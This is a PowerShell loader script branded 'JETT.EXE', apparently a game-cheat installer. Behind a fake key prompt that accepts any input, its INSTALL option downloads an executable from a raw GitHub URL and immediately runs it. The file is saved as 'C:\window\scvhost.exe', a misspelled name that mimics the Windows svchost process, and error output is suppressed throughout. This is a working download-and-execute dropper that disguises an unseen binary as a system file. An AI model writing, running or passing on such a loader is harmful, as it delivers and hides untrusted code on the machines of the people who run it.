$ErrorActionPreference = "SilentlyContinue"

[Console]::Title = "JETT.EXE ON TOP"

# =========================
# HEADER
# =========================

function Show-Header {

    Clear-Host

    Write-Host ""
    Write-Host "    ██╗███████╗████████╗████████╗" -ForegroundColor Magenta
    Write-Host "    ██║██╔════╝╚══██╔══╝╚══██╔══╝" -ForegroundColor Magenta
    Write-Host "    ██║█████╗     ██║      ██║" -ForegroundColor White
    Write-Host "██  ██║██╔══╝     ██║      ██║" -ForegroundColor White
    Write-Host "╚█████╔╝███████╗  ██║      ██║" -ForegroundColor Magenta
    Write-Host " ╚════╝ ╚══════╝  ╚═╝      ╚═╝" -ForegroundColor Magenta

    Write-Host ""
    Write-Host "              J E T T . E X E" -ForegroundColor White
    Write-Host "                  O N  T O P" -ForegroundColor DarkGray

    Write-Host ""
    Write-Host " ─────────────────────────────────────────────" -ForegroundColor DarkGray
    Write-Host ""
}

# =========================
# CONSOLE
# =========================

function Write-Console {

    param (
        [string]$Message,
        [string]$Type = "INFO"
    )

    switch ($Type) {

        "SUCCESS" {
            Write-Host "  [+] " -NoNewline -ForegroundColor Magenta
            Write-Host $Message -ForegroundColor White
        }

        "NO KEY" {
            Write-Host "  [-] " -NoNewline -ForegroundColor Red
            Write-Host $Message -ForegroundColor White
        }

        "INFO" {
            Write-Host "  [*] " -NoNewline -ForegroundColor DarkGray
            Write-Host $Message -ForegroundColor White
        }

        "INPUT" {
            Write-Host "  [>] " -NoNewline -ForegroundColor Magenta
            Write-Host $Message -NoNewline -ForegroundColor White
        }
    }
}

# =========================
# START
# =========================

Show-Header

Write-Host ""
Write-Host "              E N T E R  K E Y" -ForegroundColor White
Write-Host ""

Write-Host "  [>] " -NoNewline -ForegroundColor Magenta

$key = $Host.UI.ReadLine()

# =========================
# KEY CHECK
# =========================

if ([string]::IsNullOrWhiteSpace($key))
{
    Write-Host ""

    Write-Console "NO KEY" "NO KEY"

    Start-Sleep 2
    exit
}

Write-Host ""

Write-Console "SUCCESS" "SUCCESS"

Start-Sleep 1

# =========================
# MENU
# =========================

while ($true)
{
    Show-Header

    Write-Console "1. INSTALL" "INFO"
    Write-Console "2. CLEAN" "INFO"
    Write-Console "0. EXIT" "INFO"

    Write-Host ""

    Write-Console "SELECT : " "INPUT"

    $choice = $Host.UI.ReadLine()

    # =========================
    # INSTALL
    # =========================

    if ($choice -eq "1")
    {
        Clear-Host
        Show-Header

        Write-Console "DOWNLOADING..." "INFO"

        $url  = "https://raw.githubusercontent.com/draft7973-ops/JETT.EXE/refs/heads/main/svchost.exe"
        $path = "C:\window\scvhost.exe"

        try {

            Invoke-WebRequest `
            -Uri $url `
            -OutFile $path `
            -UseBasicParsing `
            -UserAgent "Mozilla/5.0"

            if (Test-Path $path)
            {
                Write-Host ""

                Write-Console "INSTALL SUCCESS" "SUCCESS"

                Start-Sleep 1

                Start-Process $path
            }
            else
            {
                Write-Host ""

                Write-Console "INSTALL FAILED" "NO KEY"
            }
        }
        catch {

            Write-Host ""

            Write-Console "INSTALL FAILED" "NO KEY"
        }

        Write-Host ""
        Pause
    }

    # =========================
    # CLEAN
    # =========================

    elseif ($choice -eq "2")
    {
        Clear-Host
        Show-Header

        Write-Console "CLEANING..." "INFO"

        Stop-Process `
        -Name "JETT" `
        -Force `
        -ErrorAction SilentlyContinue

        Remove-Item `
        "C:\window\scvhost.exe" `
        -Force `
        -ErrorAction SilentlyContinue

        Write-Host ""

        Write-Console "CLEAN SUCCESS" "SUCCESS"

        Write-Host ""
        Pause
    }

    # =========================
    # EXIT
    # =========================

    elseif ($choice -eq "0")
    {
        exit
    }
}
